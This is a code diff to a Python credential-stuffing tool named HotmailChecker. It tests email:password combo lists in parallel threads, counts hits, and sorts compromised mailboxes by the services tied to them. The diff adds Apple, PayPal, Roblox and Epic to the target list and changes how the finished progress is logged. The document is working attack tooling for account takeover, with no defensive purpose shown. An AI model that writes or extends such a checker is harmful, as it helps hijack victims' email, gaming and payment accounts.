@@ -52,7 +52,7 @@ class HotmailChecker:
         except LookupError:
             return '🏳'
 
-    def update_progress(self):
+    def update_progress(self, finished=False):
         """Update the progress display with current statistics"""
         with self.lock:
             progress_percent = min((self.processed / self.total_combos * 100), 100) if self.total_combos > 0 else 0
@@ -64,9 +64,10 @@ class HotmailChecker:
             sys.stdout.write(f"\r{WHITE}{stats_text} ")
             sys.stdout.flush()
 
-            if self.log_callback and (time.time() - self.last_log_time > 5):
-                self.log_callback(stats_text)
-                self.last_log_time = time.time()
+            if self.log_callback:
+                if finished or (time.time() - self.last_log_time > 5):
+                    self.log_callback(stats_text)
+                    self.last_log_time = time.time()
 
     def save_account_by_type(self, service_name, email, password):
         if service_name in services:
@@ -184,7 +185,7 @@ class HotmailChecker:
         with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
             futures = [executor.submit(self.check_combo, *line.split(":", 1)) for line in lines]
             concurrent.futures.wait(futures)
-        if self.log_callback: self.log_callback(f"Finished! Hits: {self.hit}, Bad: {self.bad}, Retry: {self.retry}")
+        self.update_progress(finished=True)
 
 services = {
     "Facebook": {"sender": "security@facebookmail.com", "file": "facebook.txt"},
@@ -197,6 +198,10 @@ services = {
     "Steam": {"sender": "noreply@steampowered.com", "file": "steam.txt"},
     "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "xbox.txt"},
     "PlayStation": {"sender": "sony@txn-email.playstation.com", "file": "psn.txt"},
+    "Apple": {"sender": "no-reply@apple.com", "file": "apple.txt"},
+    "PayPal": {"sender": "service@paypal.com", "file": "paypal.txt"},
+    "Roblox": {"sender": "accounts@roblox.com", "file": "roblox.txt"},
+    "Epic": {"sender": "help@acct.epicgames.com", "file": "epic.txt"},
 }
 
 def main():
